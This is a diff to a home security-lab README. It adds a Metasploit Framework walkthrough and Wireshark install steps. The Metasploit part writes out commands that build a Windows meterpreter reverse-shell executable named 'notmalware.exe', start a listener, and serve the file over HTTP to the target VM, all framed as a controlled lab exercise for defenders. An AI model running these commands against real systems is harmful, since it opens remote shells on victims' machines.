@@ -7,11 +7,13 @@
 4. [Setting up Ubuntu Desktop](#setting-up-ubuntu-desktop)
 5. [Installing Splunk on Ubuntu](#installing-splunk-on-ubuntu)
 6. [Installing Snort](#installing-snort)
-7. [Installing Windows 10](#installing-windows-11)
-8. [Installing Splunk Forwarder](#installing-splunk-forwarder)
-9. [Installing LimaCharlie](#installing-limacharlie)
+7. [Installing Metasploit Framework](#installing-metasploit-framework)
+8. [Wireshark Installation](#wireshark-installation)
+9. [Installing Windows 10](#installing-windows-11)
+10. [Installing Splunk Forwarder](#installing-splunk-forwarder)
+11. [Installing LimaCharlie](#installing-limacharlie)
 	- [Deploying Endpoint Agents](#deploying-endpoint-agents)
-10. [Installing Sysmon](#installing-sysmon)
+12. [Installing Sysmon](#installing-sysmon)
 
 
 ---
@@ -447,6 +449,146 @@ You can view the current IP of the machine.
 - Packet Logger Mode: Stores packets in files for analysis.
 
 - IDS/IPS Mode: Implements rule-based monitoring and prevention.
+
+---
+
+# Installing Metasploit Framework 
+
+Objective
+
+Simulate a malware attack to understand attacker techniques, endpoint behavior, and defense mechanisms using the Metasploit Framework. This activity is purely for educational purposes within a controlled lab setup.
+
+Step 1: Set Up the Environment
+
+1. Virtual Machines (VMs)
+
+Ensure you have two virtual machines:
+
+Attacker VM: Ubuntu
+
+Target VM: Windows
+
+2. Networking
+
+Attach both VMs to the same NAT network.
+
+Verify connectivity by using the ping command between the two VMs.
+
+Step 2: Install Metasploit Framework on Ubuntu
+
+1. Follow Rapid7 Documentation
+
+Visit the official Metasploit installation guide from Rapid7 for the latest installation steps.
+
+2. Command to Install Metasploit
+
+Run the following command in the Ubuntu terminal:
+
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+chmod 755 msfinstall && ./msfinstall
+
+3. Verify Installation
+
+Launch Metasploit:
+
+msfconsole
+
+Initialize the database when prompted.
+
+Step 3: Generate a Payload
+
+1. Identify Attacker IP Address
+
+Run the following command to find the attacker's machine IP address:
+
+ifconfig
+
+Example output showing attacker IP: 192.168.1.4
+
+2. Create Payload with MSFVenom
+
+Use the following command to generate the malicious payload:
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=4444 -f exe -o notmalware.exe
+
+Breakdown of the command:
+
+-p: Specifies the payload.
+
+LHOST: Attacker’s IP address.
+
+LPORT: Listening port (default: 4444).
+
+-f: Output file format (exe for Windows).
+
+-o: Output filename.
+
+3. Verify Payload
+
+Use the file command to check the generated payload:
+
+file notmalware.exe
+
+Step 4: Set Up the Listener
+
+1. Configure Metasploit Handler
+
+Open a new Metasploit session:
+
+msfconsole
+
+Set up the listener:
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.4
+set LPORT 4444
+exploit
+
+This initializes the listener to catch the reverse shell when the payload executes on the target machine.
+
+Step 5: Transfer Payload to Target VM
+
+1. Host Payload on HTTP Server
+
+Start a simple HTTP server to serve the payload:
+
+python3 -m http.server 8000
+
+The payload will now be accessible via:
+
+http://192.168.1.4:8000/notmalware.exe
+
+---
+
+# Wireshark Installation
+
+## Purpose
+
+Wireshark is used for in-depth network traffic analysis and supports both live packet capture and offline analysis. Common use cases include:
+
+Analyzing suspicious PCAP files.
+
+Performing live incident response by capturing packets directly from compromised devices.
+
+Installation Instructions
+
+Ubuntu Installation
+
+1. Default Installation:
+
+sudo apt install wireshark
+
+During installation, you will be prompted to configure whether non-root users can capture packets. Selecting "No" requires running Wireshark with sudo.
+
+2. Latest Version Installation:
+
+To install the latest stable version, add the official Wireshark PPA:
+
+sudo add-apt-repository ppa:wireshark-dev/stable
+sudo apt update
+sudo apt install wireshark
+
 
 ---
 
